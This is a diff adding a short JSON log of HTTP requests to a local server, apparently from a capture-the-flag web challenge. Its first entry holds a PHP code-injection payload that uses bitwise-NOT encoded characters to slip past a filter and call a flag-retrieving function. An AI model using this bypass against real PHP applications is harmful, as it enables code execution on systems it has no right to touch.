@@ -1,0 +1,4 @@
+{"url":"http://127.0.0.1/index.php?code=${~%a0%b8%ba%ab}{%a0}();&%a0=GetYourFlag","value":"code=%24%7B%7E%A0%B8%BA%AB%7D%7B%A0%7D%28%29%3B&%A0=GetYourFlag","style":"Get","time":"1568876681"}
+{"url":"http://127.0.0.1/","value":"","style":"Get","time":"1568876681"}
+{"url":"http://127.0.0.1/","value":"","style":"Post","time":"1568876681"}
+{"url":"http://127.0.0.1/","value":"","style":"Cookie","time":"1568876681"}
